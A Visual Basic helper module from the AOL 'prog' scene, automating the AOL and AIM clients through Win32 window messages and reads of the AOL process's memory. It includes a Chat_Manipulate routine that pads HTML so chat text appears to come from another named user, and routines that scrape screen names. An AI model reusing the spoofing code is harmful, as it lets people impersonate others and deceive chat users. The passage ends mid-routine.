Attribute VB_Name = "hack32"
' Hack32.BaZ
' AIM: hackman 6 t 9
' http://hell2k.cjb.net
'This bas file includes 136 Subz and Functions
'Pleaze Do Not Copy  or TAMPER with this BaZ File
' ;                    ;
' ;                    ;
' ;                    ;
' ; ;;    ;;;    ;;;   ;   ;  ; ;;  ;;    ;;;   ; ;;
' ;;  ;  ;   ;  ;   ;  ;  ;   ;;  ;;  ;  ;   ;  ;;  ;
' ;   ;      ;  ;      ; ;    ;   ;   ;      ;  ;   ;
' ;   ;   ;;;;  ;      ;;;    ;   ;   ;   ;;;;  ;   ;
' ;   ;  ;   ;  ;      ;  ;   ;   ;   ;  ;   ;  ;   ;
' ;   ;  ;  ;;  ;   ;  ;  ;   ;   ;   ;  ;  ;;  ;   ;
' ;   ;   ;; ;   ;;;   ;   ;  ;   ;   ;   ;; ;  ;   ;
                                                      
Option Explicit
Public Declare Function GetFocus Lib "user32" () As Long
Public Declare Function GetCursor Lib "user32" () As Long
Public Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long
Public Declare Function GetWindowWord Lib "user32" (ByVal hwnd As Long, ByVal nIndex As Long) As Integer
Public Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function SetFocusAPI Lib "user32" Alias "SetFocus" (ByVal hwnd As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (destination As Any, source As Any, ByVal Length As Long)
Public Declare Function EnableWindow Lib "user32" (ByVal hwnd As Long, ByVal cmd As Long) As Long
Public Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Public Declare Function GetClassName& Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long)
Public Declare Function SendMessageByNum& Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Public Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Public Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
Public Declare Function GetMenu Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Public Declare Function GetMenuItemID Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Public Declare Function GetMenuString Lib "user32" Alias "GetMenuStringA" (ByVal hMenu As Long, ByVal wIDItem As Long, ByVal lpString As String, ByVal nMaxCount As Long, ByVal wFlag As Long) As Long
Public Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Public Declare Function GetSubMenu Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Public Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Public Declare Function IsWindowVisible Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Public Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Public Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As String, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Public Declare Function SendMessageLong& Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Public Declare Function SendMessageByString Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Public Declare Function SetCursorPos Lib "user32" (ByVal X As Long, ByVal Y As Long) As Long
Public Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Public Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long
Public Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Public Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Public Declare Function ReleaseCapture Lib "user32" () As Long
Public Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Public Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
Public Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, lpvParam As Any, ByVal fuWinIni As Long) As Long
Public Declare Function ExitWindowsEx& Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long)
Public Declare Function SetBkColor Lib "gdi32" (ByVal hdc As Long, ByVal crColor As Long) As Long
Private Declare Function CombineRgn Lib "gdi32" (ByVal hDestRgn As Long, ByVal hSrcRgn1 As Long, ByVal hSrcRgn2 As Long, ByVal nCombineMode As Long) As Long
Private Declare Function CreateRectRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Private Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long
Private Declare Function GetPixel Lib "gdi32" (ByVal hdc As Long, ByVal X As Long, ByVal Y As Long) As Long
Private Declare Function SetWindowRgn Lib "user32" (ByVal hwnd As Long, ByVal hRgn As Long, ByVal bRedraw As Boolean) As Long
Public Declare Function SetParent Lib "user32" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Public Declare Function GetDC Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function SelectObject Lib "gdi32" (ByVal hdc As Long, ByVal hObject As Long) As Long
Public Declare Function CreateSolidBrush Lib "gdi32" (ByVal crColor As Long) As Long
Public Declare Function Rectangle Lib "gdi32" (ByVal hdc As Long, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Public Declare Function ReleaseDC Lib "user32" (ByVal hwnd As Long, ByVal hdc As Long) As Long
Public Declare Function WindowFromPointXY Lib "user32" Alias "WindowFromPoint" (ByVal xPoint As Long, ByVal yPoint As Long) As Long
Public Declare Function GetWindowLong& Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long)

Public Const FADE_RED = &HFF&
Public Const FADE_GREEN = &HFF00&
Public Const FADE_BLUE = &HFF0000
Public Const FADE_YELLOW = &HFFFF&
Public Const FADE_WHITE = &HFFFFFF
Public Const FADE_BLACK = &H0&
Public Const FADE_PURPLE = &HFF00FF
Public Const FADE_GREY = &HC0C0C0
Public Const FADE_PINK = &HFF80FF
Public Const FADE_TURQUOISE = &HC0C000

Private Const WM_SYSCOMMAND = &H112

Private lngRegion As Long
 
Public Const BM_GETCHECK = &HF0
Public Const BM_SETCHECK = &HF1
Private Const RGN_OR = 2
Public Const HWND_NOTOPMOST = -2
Public Const HWND_TOPMOST = -1
Public Const HWND_TOP = 0

Public Const LB_GETCURSEL = &H188
Public Const LB_GETCOUNT = &H18B
Public Const LB_GETITEMDATA = &H199
Public Const LB_GETTEXT = &H189
Public Const LB_GETTEXTLEN = &H18A
Public Const LB_SETCURSEL = &H186
Public Const LB_SETSEL = &H185

Public Const SND_ASYNC = &H1
Public Const SND_NODEFAULT = &H2
Public Const SND_FLAG = SND_ASYNC Or SND_NODEFAULT

Public Const SW_SHOWMAXIMIZED = 3
Public Const SW_HIDE = 0
Public Const SW_SHOW = 5
Public Const SW_MAXIMIZE = 3
Public Const SW_MINIMIZE = 6
Public Const SWP_NOMOVE = &H2
Public Const SWP_NOSIZE = &H1

Public Const EWX_REBOOT = 2
Public Const EWX_SHUTDOWN = 1

Public Const GWW_HINSTANCE = (-6)
Public Const GWW_ID = (-12)
Public Const GWL_STYLE = (-16)

Public Const VK_DOWN = &H28
Public Const VK_LEFT = &H25
Public Const VK_MENU = &H12
Public Const VK_RETURN = &HD
Public Const VK_RIGHT = &H27
Public Const VK_SHIFT = &H10
Public Const VK_SPACE = &H20
Public Const VK_UP = &H26

Public Const WM_CHAR = &H102
Public Const WM_CLOSE = &H10
Public Const WM_COMMAND = &H111
Public Const WM_GETTEXT = &HD
Public Const WM_GETTEXTLENGTH = &HE
Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101
Public Const WM_LBUTTONDBLCLK = &H203
Public Const WM_LBUTTONDOWN = &H201
Public Const WM_LBUTTONUP = &H202
Public Const WM_MOVE = &HF012
Public Const WM_SETTEXT = &HC

Public Const PROCESS_READ = &H10
Public Const RIGHTS_REQUIRED = &HF0000

Public Const ENTER_KEY = 13
Public Const FLAGS = SWP_NOMOVE Or SWP_NOSIZE

Public Const SPI_SCREENSAVERRUNNING = 97

Public Type POINTAPI
        X As Long
        Y As Long
End Type

Type RECT
        Left As Long
        Top As Long
        Right As Long
        Bottom As Long
End Type

Type COLORRGB
       Red As Long
       Green As Long
       Blue As Long
End Type
Public Sub AddRoomToList(list As ListBox, AddUser As Boolean)
    On Error Resume Next
    DoEvents
    Dim cProcess As Long, itmHold As Long, ScreenName As String
    Dim psnHold As Long, rBytes As Long, index As Long, Room As Long
    Dim rList As Long, sThread As Long, mThread As Long
    Room& = FindChatRoom
    If Room& = 0& Then Exit Sub
    rList& = FindWindowEx(Room&, 0&, "_AOL_Listbox", vbNullString)
    sThread& = GetWindowThreadProcessId(rList&, cProcess&)
    mThread& = OpenProcess(PROCESS_READ Or RIGHTS_REQUIRED, False, cProcess&)
    If mThread& Then
        For index& = 0 To SendMessage(rList&, LB_GETCOUNT, 0, 0) - 1
            ScreenName$ = String$(4, vbNullChar)
            itmHold& = SendMessage(rList, LB_GETITEMDATA, ByVal CLng(index&), ByVal 0&)
            itmHold& = itmHold& + 24
            Call ReadProcessMemory(mThread&, itmHold&, ScreenName$, 4, rBytes)
            Call CopyMemory(psnHold&, ByVal ScreenName$, 4)
            psnHold& = psnHold& + 6
            ScreenName$ = String$(16, vbNullChar)
            Call ReadProcessMemory(mThread&, psnHold&, ScreenName$, Len(ScreenName$), rBytes&)
            ScreenName$ = Left$(ScreenName$, InStr(ScreenName$, vbNullChar) - 1)
            If ScreenName$ <> UserSN() Or AddUser = True Then
                list.AddItem ScreenName$
            End If
        Next index&
        'Call CloseHandle(mThread)
    End If
End Sub

Public Sub AddSearchResults(TheList As ListBox)
Dim MDI As Long, Child As Long
Dim cProcess As Long, itmHold As Long, Result As String
Dim psnHold As Long, rBytes As Long, index As Long, Room As Long
Dim list As Long, sThread As Long, mThread As Long
MDI& = AOL_MDI&
Child& = FindWindowEx(MDI&, 0&, "AOL Child", "Member Directory Search Results")
list& = FindWindowEx(Child&, 0&, "_AOL_Listbox", vbNullString)
If Child& = 0 Then Exit Sub
DoEvents
    sThread& = GetWindowThreadProcessId(list&, cProcess&)
    mThread& = OpenProcess(PROCESS_READ Or RIGHTS_REQUIRED, False, cProcess&)
    If mThread& Then
        For index& = 0 To SendMessage(list&, LB_GETCOUNT, 0, 0) - 1
            Result = String$(4, vbNullChar)
            itmHold& = SendMessage(list&, LB_GETITEMDATA, ByVal CLng(index&), ByVal 0&)
            itmHold& = itmHold& + 24
            Call ReadProcessMemory(mThread&, itmHold&, Result, 4, rBytes)
            Call CopyMemory(psnHold&, ByVal Result, 4)
            psnHold& = psnHold& + 6
            Result = String$(16, vbNullChar)
            Call ReadProcessMemory(mThread&, psnHold&, Result, Len(Result), rBytes&)
            Result = Left$(Result, InStr(Result, "  ") + 8)
            Result = Trim(Result)
                TheList.AddItem Result
        Next index&
    End If
End Sub

Public Sub AddDownloadManagerMails(List1 As ListBox)
    Dim AOL As Long, Tool As Long, Toolbar As Long
    Dim ToolIcon As Long, DoThis As Long, sMod As Long, mThread As Long
    Dim MDI As Long, dMan As Long, dTree As Long, sThread As Long
    Dim MailName As String, index As Long, itmHold As Long, rBytes As Long
    Dim CurPos As POINTAPI, WinVis As Long, cProcess As Long, psnHold As Long
    DoEvents
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    Tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    Toolbar& = FindWindowEx(Tool&, 0&, "_AOL_Toolbar", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    Call GetCursorPos(CurPos)
    Call SetCursorPos(Screen.Width, Screen.Height)
    Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
    Do
    DoEvents
        sMod& = FindWindow("#32768", vbNullString)
        WinVis& = IsWindowVisible(sMod&)
    Loop Until WinVis& = 1
    For DoThis& = 1 To 4
        Call PostMessage(sMod&, WM_KEYDOWN, VK_DOWN, 0&)
        Call PostMessage(sMod&, WM_KEYUP, VK_DOWN, 0&)
    Next DoThis&
    Call PostMessage(sMod&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_RETURN, 0&)
    Call SetCursorPos(CurPos.X, CurPos.Y)
    Do
        DoEvents
        dMan& = FindWindowEx(MDI&, 0&, "AOL Child", "Download Manager")
        dTree& = FindWindowEx(dMan&, 0&, "_AOL_Tree", vbNullString)
    Loop Until dMan& <> 0& And dTree& <> 0&
    TimeOut 0.15
    dMan& = FindWindowEx(MDI&, 0&, "AOL Child", "Download Manager")
    dTree& = FindWindowEx(dMan&, 0&, "_AOL_Tree", vbNullString)
    sThread& = GetWindowThreadProcessId(dTree&, cProcess&)
    mThread& = OpenProcess(PROCESS_READ Or RIGHTS_REQUIRED, False, cProcess&)
    If mThread& Then
        For index& = 0 To SendMessage(dTree&, LB_GETCOUNT, 0, 0) - 1
            MailName$ = String$(4, vbNullChar)
            itmHold& = SendMessage(dTree&, LB_GETITEMDATA, ByVal CLng(index&), ByVal 0&)
            itmHold& = itmHold& + 24
            Call ReadProcessMemory(mThread&, itmHold&, MailName$, 4, rBytes)
            Call CopyMemory(psnHold&, ByVal MailName$, 4)
            psnHold& = psnHold& + 6
            MailName$ = String$(16, vbNullChar)
            Call ReadProcessMemory(mThread&, psnHold&, MailName$, Len(MailName$), rBytes&)
            MailName$ = Left$(MailName$, InStr(MailName$, vbNullChar) - 1)
            List1.AddItem MailName$
        Next index&
        Call CloseHandle(mThread&)
    End If
End Sub

Public Sub AOL5_AddRecentleyDeleted(List1 As ListBox)
On Error Resume Next
    Dim AOL As Long, MDI As Long, Child As Long
    Dim mTree As Long, AddMails As Long, sLength As Long
    Dim Spot As Long, MyString As String, Count As Long, Q As Integer
    Dim wile As String, soon As String, elev  As String, i As Long, MailStr As String

DoEvents
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Child& = FindWindowEx(MDI&, 0&, "AOL Child", UserSN & "'s Recently Deleted Mail")
    If Child& = 0& Then Exit Sub
    mTree& = FindWindowEx(Child&, 0&, "_AOL_Tree", vbNullString)
    Count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If Count& = 0 Then Exit Sub
For i = 0 To Count& - 1
    MailStr$ = String$(255, " ")
    Q = SendMessageByString(mTree&, LB_GETTEXT, i, MailStr$)
    wile = InStr(MailStr$, Chr(9))
    soon = Mid(MailStr$, wile + 1, Len(MailStr$))
    elev = InStr(soon, Chr(9))
    MailStr$ = Mid(soon, elev + 1, Len(soon))
    List1.AddItem Trim(MailStr$)
  DoEvents
Next i
End Sub

Public Sub Form_Explode(Frm As Form, CFlag As Integer, STEPS As Integer)
Dim FRect As RECT
Dim FWidth, FHeight As Integer
Dim i, X, Y, cx, cy As Integer
Dim hScreen, Brush As Integer, OldBrush
    GetWindowRect Frm.hwnd, FRect
    FWidth = (FRect.Right - FRect.Left)
    FHeight = FRect.Bottom - FRect.Top
    hScreen = GetDC(0)
    Brush = CreateSolidBrush(Frm.BackColor)
    OldBrush = SelectObject(hScreen, Brush)
    For i = 1 To STEPS
        cx = FWidth * (i / STEPS)
        cy = FHeight * (i / STEPS)
        If CFlag Then
            X = FRect.Left + (FWidth - cx) / 2
            Y = FRect.Top + (FHeight - cy) / 2
        Else
            X = FRect.Left
            Y = FRect.Top
        End If
        Rectangle hScreen, X, Y, X + cx, Y + cy
    Next i
    If ReleaseDC(0, hScreen) = 0 Then
        MsgBox "Unable to Release Device Context", 16, "Device Error"
    End If
    DeleteObject (Brush)
    Frm.Show
End Sub
Sub Form_Fade(Form As Object, Color1 As Long, Color2 As Long)
Dim B1 As Long, G1 As Long, R1 As Long, B2 As Long, G2 As Long, R2 As Long
    B1 = GetRGB(Color1).Blue
    G1 = GetRGB(Color1).Green
    R1 = GetRGB(Color1).Red
    B2 = GetRGB(Color2).Blue
    G2 = GetRGB(Color2).Green
    R2 = GetRGB(Color2).Red
    Dim intLoop As Integer
    Form.DrawStyle = vbInsideSolid
    Form.DrawMode = vbCopyPen
    Form.ScaleMode = vbPixels
    Form.DrawWidth = 2
    Form.ScaleHeight = 256
    For intLoop = 0 To 255
        Form.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(((R2 - R1) / 255 * intLoop) + R1, ((G2 - G1) / 255 * intLoop) + G1, ((B2 - B1) / 255 * intLoop) + B1), B
    Next intLoop
End Sub

Public Sub AOL_ChangeCaption(NewCap As String)
Dim AOL As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
Call SendMessageByString(AOL&, WM_SETTEXT, 0, NewCap & "    ~hackBaZ32")
End Sub

Public Function AOL_Child() As Long
Dim AOL As Long, MDI As Long, Child As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    AOL_Child = Child&
End Function


Public Sub AOL_Hide()
Dim AOL As Long
AOL = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(AOL, SW_HIDE)
End Sub

Public Function AOL_MDI() As Long
Dim AOL As Long, MDI As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    AOL_MDI = MDI&
End Function

Public Function AOL_Version() As String
Dim aMenu As Long, mcount As Long
Dim LookFor As Long, sMenu As Long, sCount As Long
Dim LookSub As Long, sID As Long, sString As String
Dim AOL As Long, AOTooL As Long, AOTool2 As Long
Dim Glyph As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
AOTooL& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
AOTool2& = FindWindowEx(AOTooL&, 0&, "_AOL_Toolbar", vbNullString)
Glyph& = FindWindowEx(AOTool2&, 0&, "_AOL_Glyph", vbNullString)
    aMenu& = GetMenu(AOL&)
    mcount& = GetMenuItemCount(aMenu&)
    For LookFor& = 0& To mcount& - 1
        sMenu& = GetSubMenu(aMenu&, LookFor&)
        sCount& = GetMenuItemCount(sMenu&)
        For LookSub& = 0 To sCount& - 1
            sID& = GetMenuItemID(sMenu&, LookSub&)
            sString$ = String$(100, " ")
            Call GetMenuString(sMenu&, sID&, sString$, 100&, 1&)
            If InStr(LCase(sString$), LCase("&What's New in AOL 5.0")) Then
                AOL_Version = "5"
                Exit Function
            End If
        Next LookSub&
    Next LookFor&
If Glyph& <> 0 Then
AOL_Version = "4"
Exit Function
End If
AOL_Version = "3"
End Function

Public Function ascii() As String
'Add your prog ascii here
ascii = "º•[×]• "
End Function



Public Sub Kill_ErrorWindow()
'This safely gets rid of the error box, allowing you to stay online

Dim Waol As Long, CloseW As Long
Waol& = FindWindow("#32770", "Waol")
Call ShowWindow(Waol&, SW_MINIMIZE)
Call ShowWindow(Waol&, SW_HIDE)
End Sub

Public Sub MakeMailList(List1 As ListBox, TxtList As TextBox)
' This sub makes a list from your mail.  It's meant for server lists.  First have your
' mail added to a VB listbox, then call this sub

Dim i As Integer
For i = 0 To List1.ListCount - 1
TxtList = TxtList & i + 1 & ".)   " & List1.list(i)
Next i
End Sub

Public Sub Send_AIM(Who As String, Message As String)
Dim AIM As Long, Group As Long, Button As Long, im As Long, IMcombo As Long, IMto As Long, IMmessage As Long, Send As Long
AIM& = FindWindow("_Oscar_BuddyListWin", vbNullString)
Group& = FindWindowEx(AIM&, 0&, "_Oscar_TabGroup", vbNullString)
Button& = FindWindowEx(Group&, 0&, "_Oscar_IconBtn", vbNullString)
ClickAOLIcon (Button&)
im& = FindWindow("AIM_IMessage", vbNullString)
IMcombo& = FindWindowEx(im&, 0&, "_Oscar_PersistantCombo", vbNullString)
IMto& = FindWindowEx(IMcombo&, 0&, "Edit", vbNullString)
Call SendMessageByString(IMto&, WM_SETTEXT, 0, Who$)
IMmessage& = FindWindowEx(im&, 0&, "WndAte32Class", vbNullString)
IMmessage& = GetWindow(IMmessage&, 2)
Call SendMessageByString(IMmessage&, WM_SETTEXT, 0, Message$)
Send& = FindWindowEx(im&, 0&, "_Oscar_IconBtn", vbNullString)
ClickAOLIcon (Send&)
End Sub

Public Sub Chat_Manipulate(YouSay As String, Who As String, What As String)
If Len(Who) = 1 Then SendChat "" + YouSay + "<font ptsize=1></h2><font ptsize=8><font color=#0000FF><b>" & Who & ":                               <font color=#000000></b><font ptsize=10>" & What & "<font color=#fefefe><<a"
If Len(Who) = 2 Then SendChat "" + YouSay + "<font ptsize=1></h2><font ptsize=8><font color=#0000FF><b>" & Who & ":                              <font color=#000000></b><font ptsize=10>" & What & "<font color=#fefefe><<a"
If Len(Who) = 3 Then SendChat "" + YouSay + "<font ptsize=1></h2><font ptsize=8><font color=#0000FF><b>" & Who & ":                            <font color=#000000></b><font ptsize=10>" & What & "<font color=#fefefe><<a"
If Len(Who) = 4 Then SendChat "" + YouSay + "<font ptsize=1></h2><font ptsize=8><font color=#0000FF><b>" & Who & ":                          <font color=#000000></b><font ptsize=10>" & What & "<font color=#fefefe><<a"
If Len(Who) = 5 Then SendChat "" + YouSay + "<font ptsize=1></h2><font ptsize=8><font color=#0000FF><b>" & Who & ":                        <font color=#000000></b><font ptsize=10>" & What & "<font color=#fefefe><<a"
If Len(Who) = 6 Then SendChat "" + YouSay + "<font ptsize=1></h2><font ptsize=8><font color=#0000FF><b>" & Who & ":                      <font color=#000000></b><font ptsize=10>" & What & "<font color=#fefefe><<a"
If Len(Who) = 7 Then SendChat "" + YouSay + "<font ptsize=1></h2><font ptsize=8><font color=#0000FF><b>" & Who & ":                    <font color=#000000></b><font ptsize=10>" & What & "<font color=#fefefe><<a"
If Len(Who) = 8 Then SendChat "" + YouSay + "<font ptsize=1></h2><font ptsize=8><font color=#0000FF><b>" & Who & ":                 <font color=#000000></b><font ptsize=10>" & What & "<font color=#fefefe><<a"
If Len(Who) = 9 Then SendChat "" + YouSay + "<font ptsize=1></h2><font ptsize=8><font color=#0000FF><b>" & Who & ":               <font color=#000000></b><font ptsize=10>" & What & "<font color=#fefefe><<a"
If Len(Who) = 10 Then SendChat "" + YouSay + "<font ptsize=1></h2><font ptsize=8><font color=#0000FF><b>" & Who & ":              <font color=#000000></b><font ptsize=10>" & What & "<font color=#fefefe><<a"
If Len(Who) > 10 Then SendChat "" + YouSay + "<font ptsize=1></h2><font ptsize=8><font color=#0000FF><b>" & Who & ":           <font color=#000000></b><font ptsize=10>" & What & "<font color=#fefefe><<a"
End Sub

Public Sub CopyListBox(List1 As ListBox, destination As ListBox)
Dim i As Integer
For i = 0 To List1.ListCount - 1
destination.AddItem List1.list(i)
Next i
End Sub

Public Function Download_PercentDone() As String
Dim AOL As Long, MDI As Long, Trans As Long, File As String
Dim Statc As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Trans& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    Statc& = FindWindowEx(Trans&, 0&, "_AOL_Static", vbNullString)
    If Statc& <> 0 Then
    File = GetText(Trans)
    File = Right(File, 4)
    Download_PercentDone = Trim(File)
    End If
End Function

Public Function Download_FileName() As String
Dim AOL As Long, MDI As Long, Trans As Long, FName As String
Dim Statc As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Trans& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    Statc& = FindWindowEx(Trans&, 0&, "_AOL_Static", vbNullString)
    If Statc& <> 0 Then
    FName = GetText(Statc&)
    FName = Mid(FName, InStr("Downloading ", " ") + 12)
    Download_FileName = FName
    End If
End Function
Public Function Download_MinutesLeft() As String
Dim AOL As Long, MDI As Long, Trans As Long, Min As String
Dim Statc As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Trans& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    Statc& = FindWindowEx(Trans&, 0&, "_AOL_Static", vbNullString)
    Statc& = FindWindowEx(Trans&, Statc&, "_AOL_Static", vbNullString)
    If Statc& <> 0 Then
    Min = GetText(Statc&)
    Min = Mid(Min, InStr("About ", " ") + 1)
    Min = Left(Min, 3)
    Download_MinutesLeft = Min
    End If
End Function
Public Function Enter() As String
Enter = Chr$(13) + Chr$(10)
End Function

Public Function FindIMWindow() As Long
Dim AOL As Long, MDI As Long, Child As Long, im As String
AOL = FindWindow("AOL Frame25", vbNullString)
MDI = FindWindowEx(AOL, 0&, "MDIClient", vbNullString)
Child = FindWindowEx(MDI, 0&, "AOL Child", vbNullString)
im = GetCaption(Child)
    If InStr(im, "Instant Message") <> 0 Then
        FindIMWindow = Child
    End If
End Function


Public Sub Chat_IgnorePerson(name As String)
' This ignores a person in a chat Room.  This is a smart ignorer, in other
' words, if you want to ignore VBPuFF , you can type do this:
' Call Chat_IgnorePerson("PuFF"), and it'll still ignore them.

    On Error Resume Next
    Dim cProcess As Long, itmHold As Long, ScreenName As String
    Dim psnHold As Long, rBytes As Long, index As Long, Room As Long
    Dim rList As Long, sThread As Long, mThread As Long, iCheck As Long
    Dim lIndex As Long, iWindow As Long, a As Long, Child As Long
    Room& = FindChatRoom()
    If Room& = 0& Then Exit Sub
    rList& = FindWindowEx(Room&, 0&, "_AOL_Listbox", vbNullString)
    iCheck& = FindWindowEx(iWindow&, 0&, "_AOL_Checkbox", vbNullString)
    sThread& = GetWindowThreadProcessId(rList, cProcess&)
    mThread& = OpenProcess(PROCESS_READ Or RIGHTS_REQUIRED, False, cProcess&)
    If mThread& Then
        For index& = 0 To SendMessage(rList, LB_GETCOUNT, 0, 0) - 1
            ScreenName$ = String$(4, vbNullChar)
            itmHold& = SendMessage(rList, LB_GETITEMDATA, ByVal CLng(index&), ByVal 0&)
            itmHold& = itmHold& + 24
            Call ReadProcessMemory(mThread&, itmHold&, ScreenName$, 4, rBytes)
            Call CopyMemory(psnHold&, ByVal ScreenName$, 4)
            psnHold& = psnHold& + 6
            ScreenName$ = String$(16, vbNullChar)
            Call ReadProcessMemory(mThread&, psnHold&, ScreenName$, Len(ScreenName$), rBytes&)
            ScreenName$ = Left$(ScreenName$, InStr(ScreenName$, vbNullChar) - 1)
            If InStr(LCase(ScreenName), LCase(name)) Then
                lIndex& = index&
                        Call SendMessage(rList&, LB_SETCURSEL, index&, 0&)
                        Call PostMessage(rList&, WM_LBUTTONDBLCLK, 0&, 0&)
                        Do
                        DoEvents
                        iWindow& = FindWindowEx(AOL_MDI&, 0&, "AOL Child", ScreenName)
                        Loop Until iWindow& <> 0&
                        DoEvents
                        iCheck& = FindWindowEx(iWindow&, 0&, "_AOL_Checkbox", vbNullString)
                        DoEvents
